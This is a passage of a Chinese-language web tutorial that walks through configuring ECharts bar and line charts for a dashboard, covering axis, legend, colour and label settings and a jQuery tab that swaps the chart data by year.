class="number">15</span>,</span><br><span class="line">                    <span class="comment">// padding: 5,</span></span><br><span class="line">                    align: <span class="string">"center"</span>,</span><br><span class="line">                    width: <span class="number">15</span>,</span><br><span class="line">                    height: <span class="number">15</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">],</span><br></pre></td></tr></table></figure><p>需求4： </p><ul><li><p>修改第一组柱子相关样式（条状）</p></li><li><p>设置第一组柱子内百分比显示数据</p></li><li><p>设置第一组柱子不同颜色</p></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">                name: <span class="string">"条"</span>,</span><br><span class="line">                type: <span class="string">"bar"</span>, <span class="comment">//类型</span></span><br><span class="line">                yAxisIndex: <span class="number">0</span>, <span class="comment">//使用的 y 轴的 index，bar的基部位置</span></span><br><span class="line">                data: data,</span><br><span class="line">                barCategoryGap: <span class="number">50</span>,</span><br><span class="line">                barWidth: <span class="number">10</span>, <span class="comment">//bar宽度</span></span><br><span class="line">                itemStyle: &#123; <span class="comment">//图形样式</span></span><br><span class="line">                    normal: &#123;</span><br><span class="line">                        barBorderRadius: <span class="number">20</span>, <span class="comment">//数据条圆角</span></span><br><span class="line">                        <span class="comment">//定义函数分配每个数据值的颜色，不知道%num啥意思</span></span><br><span class="line">                        color: <span class="function"><span class="keyword">function</span>(<span class="params">params</span>) </span>&#123;</span><br><span class="line">                            <span class="comment">// var num = myColor.length;</span></span><br><span class="line">                            <span class="comment">// console.log(params);</span></span><br><span class="line">                            <span class="comment">// return myColor[params.dataIndex % num]</span></span><br><span class="line">                            <span class="keyword">return</span> myColor[params.dataIndex]</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                label: &#123; <span class="comment">//标签</span></span><br><span class="line">                    normal: &#123;</span><br><span class="line">                        show: <span class="literal">true</span>,</span><br><span class="line">                        position: <span class="string">"inside"</span>, <span class="comment">//标签位置</span></span><br><span class="line">                        formatter: <span class="string">"&#123;c&#125;%"</span> <span class="comment">//数值</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br></pre></td></tr></table></figure><p>需求5： 修改第二组柱子的相关配置（框状）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    name: <span class="string">"框"</span>,</span><br><span class="line">    type: <span class="string">"bar"</span>,</span><br><span class="line">    yAxisIndex: <span class="number">1</span>,</span><br><span class="line">    barCategoryGap: <span class="number">50</span>,</span><br><span class="line">    data: [<span class="number">100</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">100</span>],</span><br><span class="line">    barWidth: <span class="number">15</span>,</span><br><span class="line">    itemStyle: &#123;</span><br><span class="line">        normal: &#123;</span><br><span class="line">            color: <span class="string">"none"</span>, <span class="comment">//去掉填充颜色</span></span><br><span class="line">            borderColor: <span class="string">"#00c1de"</span>,</span><br><span class="line">            borderWidth: <span class="number">3</span>, <span class="comment">//边框宽度</span></span><br><span class="line">            barBorderRadius: <span class="number">15</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需求6： 给y轴添加第二组数据</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义右侧y坐标轴</span></span><br><span class="line">&#123;</span><br><span class="line">    show: <span class="literal">true</span>,</span><br><span class="line">    inverse: <span class="literal">true</span>,</span><br><span class="line">    data: valdata,</span><br><span class="line">    axisLabel: &#123;</span><br><span class="line">        textStyle: &#123;</span><br><span class="line">            fontSize: <span class="number">12</span>,</span><br><span class="line">            color: <span class="string">"#fff"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需求7： 设置两组柱子层叠以及更换数据</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 给series  第一个对象里面的 添加 </span></span><br><span class="line">yAxisIndex: <span class="number">0</span>,</span><br><span class="line"><span class="comment">// 给series  第二个对象里面的 添加 </span></span><br><span class="line">yAxisIndex: <span class="number">1</span>,</span><br><span class="line"><span class="comment">// series 第一个对象里面的data</span></span><br><span class="line">data: [<span class="number">70</span>, <span class="number">34</span>, <span class="number">60</span>, <span class="number">78</span>, <span class="number">69</span>],</span><br><span class="line"><span class="comment">// series 第二个对象里面的data</span></span><br><span class="line">data: [<span class="number">100</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">100</span>],</span><br><span class="line"><span class="comment">// y轴更换第一个对象更换data数据</span></span><br><span class="line">data: [<span class="string">"中国"</span>, <span class="string">"美国"</span>, <span class="string">"日本"</span>, <span class="string">"伊朗"</span>, <span class="string">"意大利"</span>],</span><br><span class="line"><span class="comment">// y轴更换第二个对象更换data数据</span></span><br><span class="line">data:[<span class="number">702</span>, <span class="number">350</span>, <span class="number">610</span>, <span class="number">793</span>, <span class="number">664</span>],</span><br></pre></td></tr></table></figure><p>完整代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 学习进度柱状图模块</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 基于准备好的dom，初始化echarts实例</span></span><br><span class="line">    <span class="keyword">var</span> myChart = echarts.init(<span class="built_in">document</span>.querySelector(<span class="string">".bar1 .chart"</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> data = [<span class="number">70</span>, <span class="number">34</span>, <span class="number">60</span>, <span class="number">78</span>, <span class="number">69</span>];</span><br><span class="line">    <span class="keyword">var</span> titlename = [<span class="string">"中国"</span>, <span class="string">"美国"</span>, <span class="string">"日本"</span>, <span class="string">"伊朗"</span>, <span class="string">"意大利"</span>];</span><br><span class="line">    <span class="keyword">var</span> valdata = [<span class="number">702</span>, <span class="number">350</span>, <span class="number">610</span>, <span class="number">793</span>, <span class="number">664</span>];</span><br><span class="line">    <span class="keyword">var</span> myColor = [<span class="string">"#1089E7"</span>, <span class="string">"#F57474"</span>, <span class="string">"#56D0E3"</span>, <span class="string">"#F8B448"</span>, <span class="string">"#8B78F6"</span>];</span><br><span class="line">    option = &#123;</span><br><span class="line">        <span class="comment">//图表位置（网格）</span></span><br><span class="line">        grid: &#123;</span><br><span class="line">            top: <span class="string">"10%"</span>,</span><br><span class="line">            left: <span class="string">"22%"</span>,</span><br><span class="line">            bottom: <span class="string">"10%"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">//X轴</span></span><br><span class="line">        xAxis: &#123;</span><br><span class="line">            show: <span class="literal">false</span> <span class="comment">//取消显示x轴（包括竖线）</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">//y轴</span></span><br><span class="line">        yAxis: [&#123;</span><br><span class="line">                show: <span class="literal">true</span>, <span class="comment">//显示y轴</span></span><br><span class="line">                data: titlename, <span class="comment">//类目数据</span></span><br><span class="line">                inverse: <span class="literal">true</span>, <span class="comment">//反向坐标轴</span></span><br><span class="line">                axisLine: &#123; <span class="comment">//坐标轴线</span></span><br><span class="line">                    show: <span class="literal">false</span></span><br><span class="line">                &#125;,</span><br><span class="line">                splitLine: &#123; <span class="comment">//分割线</span></span><br><span class="line">                    show: <span class="literal">false</span></span><br><span class="line">                &#125;,</span><br><span class="line">                axisTick: &#123; <span class="comment">//坐标轴刻度</span></span><br><span class="line">                    show: <span class="literal">false</span></span><br><span class="line">                &#125;,</span><br><span class="line">                axisLabel: &#123;</span><br><span class="line">                    color: <span class="string">"#fff"</span>, <span class="comment">//标注字体颜色    </span></span><br><span class="line">                    rich: &#123; <span class="comment">//富文本样式</span></span><br><span class="line">                        lg: &#123;</span><br><span class="line">                            backgroundColor: <span class="string">"#391"</span>,</span><br><span class="line">                            color: <span class="string">"#fff"</span>,</span><br><span class="line">                            borderRadius: <span class="number">15</span>,</span><br><span class="line">                            <span class="comment">// padding: 5,</span></span><br><span class="line">                            align: <span class="string">"center"</span>,</span><br><span class="line">                            width: <span class="number">15</span>,</span><br><span class="line">                            height: <span class="number">15</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">//定义右侧y坐标轴</span></span><br><span class="line">            &#123;</span><br><span class="line">                show: <span class="literal">true</span>,</span><br><span class="line">                inverse: <span class="literal">true</span>,</span><br><span class="line">                data: valdata,</span><br><span class="line">                axisLabel: &#123;</span><br><span class="line">                    textStyle: &#123;</span><br><span class="line">                        fontSize: <span class="number">12</span>,</span><br><span class="line">                        color: <span class="string">"#fff"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        series: [&#123;</span><br><span class="line">                name: <span class="string">"条"</span>,</span><br><span class="line">                type: <span class="string">"bar"</span>, <span class="comment">//类型</span></span><br><span class="line">                yAxisIndex: <span class="number">0</span>, <span class="comment">//使用的 y 轴的 index，bar的基部位置</span></span><br><span class="line">                data: data,</span><br><span class="line">                barCategoryGap: <span class="number">50</span>,</span><br><span class="line">                barWidth: <span class="number">10</span>, <span class="comment">//bar宽度</span></span><br><span class="line">                itemStyle: &#123; <span class="comment">//图形样式</span></span><br><span class="line">                    normal: &#123;</span><br><span class="line">                        barBorderRadius: <span class="number">20</span>, <span class="comment">//数据条圆角</span></span><br><span class="line">                        <span class="comment">//定义函数分配每个数据值的颜色，不知道%num啥意思</span></span><br><span class="line">                        color: <span class="function"><span class="keyword">function</span>(<span class="params">params</span>) </span>&#123;</span><br><span class="line">                            <span class="comment">// var num = myColor.length;</span></span><br><span class="line">                            <span class="comment">// console.log(params);</span></span><br><span class="line">                            <span class="comment">// return myColor[params.dataIndex % num]</span></span><br><span class="line">                            <span class="keyword">return</span> myColor[params.dataIndex]</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                label: &#123; <span class="comment">//标签</span></span><br><span class="line">                    normal: &#123;</span><br><span class="line">                        show: <span class="literal">true</span>,</span><br><span class="line">                        position: <span class="string">"inside"</span>, <span class="comment">//标签位置</span></span><br><span class="line">                        formatter: <span class="string">"&#123;c&#125;%"</span> <span class="comment">//数值</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="comment">//第二个图形</span></span><br><span class="line">            &#123;</span><br><span class="line">                name: <span class="string">"框"</span>,</span><br><span class="line">                type: <span class="string">"bar"</span>,</span><br><span class="line">                yAxisIndex: <span class="number">1</span>,</span><br><span class="line">                barCategoryGap: <span class="number">50</span>,</span><br><span class="line">                data: [<span class="number">100</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">100</span>],</span><br><span class="line">                barWidth: <span class="number">15</span>,</span><br><span class="line">                itemStyle: &#123;</span><br><span class="line">                    normal: &#123;</span><br><span class="line">                        color: <span class="string">"none"</span>, <span class="comment">//去掉填充颜色</span></span><br><span class="line">                        borderColor: <span class="string">"#00c1de"</span>,</span><br><span class="line">                        borderWidth: <span class="number">3</span>, <span class="comment">//边框宽度</span></span><br><span class="line">                        barBorderRadius: <span class="number">15</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用刚指定的配置项和数据显示图表。</span></span><br><span class="line">    myChart.setOption(option);</span><br><span class="line">    <span class="built_in">window</span>.addEventListener(<span class="string">"resize"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        myChart.resize();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><h2 id="折线图1-模块"><a href="#折线图1-模块" class="headerlink" title="折线图1 模块"></a>折线图1 模块</h2><ul><li>官网找到类似实例， 适当分析，并且引入到HTML页面中</li><li>根据需求定制图表</li></ul><p>需求1： 修改折线图大小，显示边框设置颜色：#012f4a，并且显示刻度标签。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">grid: &#123;</span><br><span class="line">    top: <span class="string">"20%"</span>,</span><br><span class="line">    left: <span class="string">"3%"</span>,</span><br><span class="line">    right: <span class="string">"4%"</span>,</span><br><span class="line">    bottom: <span class="string">"3%"</span>,</span><br><span class="line">    show: <span class="literal">true</span>,</span><br><span class="line">    borderColor: <span class="string">"#012f4a"</span>,</span><br><span class="line">    containLabel: <span class="literal">true</span> <span class="comment">//包含刻度</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>需求2： 修改图例组件中的文字颜色 #4c9bfd， 距离右侧 right 为 10%</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//图例模块</span></span><br><span class="line">legend: &#123;</span><br><span class="line">    <span class="comment">// 距离容器10%</span></span><br><span class="line">    right: <span class="string">"10%"</span>,</span><br><span class="line">    <span class="comment">// 修饰图例文字的颜色</span></span><br><span class="line">    textStyle: &#123;</span><br><span class="line">        color: <span class="string">"#4c9bfd"</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果series 里面设置了name，此时图例组件的data可以省略</span></span><br><span class="line">    <span class="comment">// data: ["邮件营销", "联盟广告"]</span></span><br></pre></td></tr></table></figure><p>需求3： x轴相关配置</p><ul><li>刻度去除</li><li>x轴刻度标签字体颜色：#4c9bfd</li><li>剔除x坐标轴线颜色（将来使用Y轴分割线)</li><li>轴两端是不需要内间距 boundaryGap</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">xAxis: &#123;</span><br><span class="line">    type: <span class="string">'category'</span>,</span><br><span class="line">    boundaryGap: <span class="literal">false</span>,</span><br><span class="line">    data: [<span class="string">'1月'</span>, <span class="string">'2月'</span>, <span class="string">'3月'</span>, <span class="string">'4月'</span>, <span class="string">'5月'</span>, <span class="string">'6月'</span>, <span class="string">'7月'</span>, <span class="string">'8月'</span>, <span class="string">'9月'</span>, <span class="string">'10月'</span>, <span class="string">'11月'</span>, <span class="string">'12月'</span>],</span><br><span class="line">    <span class="comment">//去除刻度</span></span><br><span class="line">    axisTick: &#123;</span><br><span class="line">        show: <span class="literal">false</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//修改刻度标签颜色</span></span><br><span class="line">    axisLabel: &#123;</span><br><span class="line">        color: <span class="string">"white"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//去除x坐标轴</span></span><br><span class="line">    axisLine: &#123;</span><br><span class="line">        show: <span class="literal">false</span></span><br><span class="line">    &#125;,</span><br><span class="line">    boundaryGap: <span class="literal">false</span> <span class="comment">// 去除轴内间距</span></span><br><span class="line"></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>需求4： y轴的定制</p><ul><li>刻度去除</li><li>字体颜色：#4c9bfd</li><li>分割线颜色：#012f4a</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">yAxis: &#123;</span><br><span class="line">    type: <span class="string">'value'</span>,</span><br><span class="line">    <span class="comment">//去除y轴刻度</span></span><br><span class="line">    axisTick: &#123;</span><br><span class="line">        show: <span class="literal">false</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//修改刻度标签颜色</span></span><br><span class="line">    axisLabel: &#123;</span><br><span class="line">        color: <span class="string">"white"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">//修改y轴分割线颜色</span></span><br><span class="line">    splitLine: &#123;</span><br><span class="line">        lineStyle: &#123;</span><br><span class="line">            color: <span class="string">"#012f4a"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>需求5： 两条线形图定制</p><ul><li>颜色分别：#00f2f1  #ed3f35</li><li>把折线修饰为圆滑 series 数据中添加 smooth 为 true</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">series: [&#123;</span><br><span class="line">        name: <span class="string">'现存确诊'</span>,</span><br><span class="line">        type: <span class="string">'line'</span>,</span><br><span class="line">        stack: <span class="string">'总量'</span>,</span><br><span class="line">        data: [<span class="number">24</span>, <span class="number">40</span>, <span class="number">101</span>, <span class="number">134</span>, <span class="number">90</span>, <span class="number">230</span>, <span class="number">210</span>, <span class="number">230</span>, <span class="number">120</span>, <span class="number">230</span>, <span class="number">210</span>, <span class="number">120</span>],</span><br><span class="line">        smooth: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        name: <span class="string">'累计确诊'</span>,</span><br><span class="line">        type: <span class="string">'line'</span>,</span><br><span class="line">        stack: <span class="string">'总量'</span>,</span><br><span class="line">        data: [<span class="number">40</span>, <span class="number">64</span>, <span class="number">191</span>, <span class="number">324</span>, <span class="number">290</span>, <span class="number">330</span>, <span class="number">310</span>, <span class="number">213</span>, <span class="number">180</span>, <span class="number">200</span>, <span class="number">180</span>, <span class="number">79</span>],</span><br><span class="line">        smooth: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>需求6： 配置数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// x轴的文字</span></span><br><span class="line">xAxis: &#123;</span><br><span class="line">  type: <span class="string">'category'</span>,</span><br><span class="line">  data: [<span class="string">'1月'</span>, <span class="string">'2月'</span>, <span class="string">'3月'</span>, <span class="string">'4月'</span>, <span class="string">'5月'</span>, <span class="string">'6月'</span>, <span class="string">'7月'</span>, <span class="string">'8月'</span>, <span class="string">'9月'</span>, <span class="string">'10月'</span>, <span class="string">'11月'</span>, <span class="string">'12月'</span>],</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 图表数据</span></span><br><span class="line">        series: [&#123;</span><br><span class="line">                name: <span class="string">'现存确诊'</span>,</span><br><span class="line">                type: <span class="string">'line'</span>,</span><br><span class="line">                stack: <span class="string">'总量'</span>,</span><br><span class="line">                data: [<span class="number">24</span>, <span class="number">40</span>, <span class="number">101</span>, <span class="number">134</span>, <span class="number">90</span>, <span class="number">230</span>, <span class="number">210</span>, <span class="number">230</span>, <span class="number">120</span>, <span class="number">230</span>, <span class="number">210</span>, <span class="number">120</span>]</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                name: <span class="string">'累计确诊'</span>,</span><br><span class="line">                type: <span class="string">'line'</span>,</span><br><span class="line">                stack: <span class="string">'总量'</span>,</span><br><span class="line">                data: [<span class="number">40</span>, <span class="number">64</span>, <span class="number">191</span>, <span class="number">324</span>, <span class="number">290</span>, <span class="number">330</span>, <span class="number">310</span>, <span class="number">213</span>, <span class="number">180</span>, <span class="number">200</span>, <span class="number">180</span>, <span class="number">79</span>]</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br></pre></td></tr></table></figure><p>需求7： 新增需求  点击 2020年   2021年 数据发生变化</p><p>以下是后台送过来数据（ajax请求过来的）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> yearData = [</span><br><span class="line">     &#123;</span><br><span class="line">       year: <span class="string">'2020'</span>,  <span class="comment">// 年份</span></span><br><span class="line">       data: [  <span class="comment">// 两个数组是因为有两条线</span></span><br><span class="line">            [<span class="number">24</span>, <span class="number">40</span>, <span class="number">101</span>, <span class="number">134</span>, <span class="number">90</span>, <span class="number">230</span>, <span class="number">210</span>, <span class="number">230</span>, <span class="number">120</span>, <span class="number">230</span>, <span class="number">210</span>, <span class="number">120</span>],</span><br><span class="line">            [<span class="number">40</span>, <span class="number">64</span>, <span class="number">191</span>, <span class="number">324</span>, <span class="number">290</span>, <span class="number">330</span>, <span class="number">310</span>, <span class="number">213</span>, <span class="number">180</span>, <span class="number">200</span>, <span class="number">180</span>, <span class="number">79</span>]</span><br><span class="line">         ]</span><br><span class="line">     &#125;,</span><br><span class="line">     &#123;</span><br><span class="line">       year: <span class="string">'2021'</span>,  <span class="comment">// 年份</span></span><br><span class="line">       data: [  <span class="comment">// 两个数组是因为有两条线</span></span><br><span class="line">            [<span class="number">123</span>, <span class="number">175</span>, <span class="number">112</span>, <span class="number">197</span>, <span class="number">121</span>, <span class="number">67</span>, <span class="number">98</span>, <span class="number">21</span>, <span class="number">43</span>, <span class="number">64</span>, <span class="number">76</span>, <span class="number">38</span>],</span><br><span class="line">    [<span class="number">143</span>, <span class="number">131</span>, <span class="number">165</span>, <span class="number">123</span>, <span class="number">178</span>, <span class="number">21</span>, <span class="number">82</span>, <span class="number">64</span>, <span class="number">43</span>, <span class="number">60</span>, <span class="number">19</span>, <span class="number">34</span>]</span><br><span class="line">         ]</span><br><span class="line">     &#125;</span><br><span class="line">    ];</span><br></pre></td></tr></table></figure><ul><li>tab栏切换事件</li><li>点击2020按钮   需要把 series 第一个对象里面的data  换成  2020年对象里面data[0] </li><li>点击2020按钮   需要把 series 第二个对象里面的data  换成  2020年对象里面data[1] </li><li>2021 按钮同样道理</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 5.点击切换效果</span></span><br><span class="line">$(<span class="string">".line h2"</span>).on(<span class="string">"click"</span>, <span class="string">"a"</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// alert(1);</span></span><br><span class="line">  <span class="comment">// console.log($(this).index());</span></span><br><span class="line">  <span class="comment">// 点击 a 之后 根据当前a的索引号 找到对应的 yearData的相关对象</span></span><br><span class="line">  <span class="comment">// console.log(yearData[$(this).index()]);</span></span><br><span class="line">  <span class="keyword">var</span> obj = yearData[$(<span class="keyword">this</span>).index()];</span><br><span class="line">  option.series[<span class="number">0</span>].data = obj.data[<span class="number">0</span>];</span><br><span class="line">  option.series[<span class="number">1</span>].data = obj.data[<span class="number">1</span>];</span><br><span class="line">  <span class="comment">// 需要重新渲染</span></span><br><span class="line">  myChart.setOption(option);</span><br></pre></td></tr></table></figure><p>完整代码（这里去掉年份需求）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 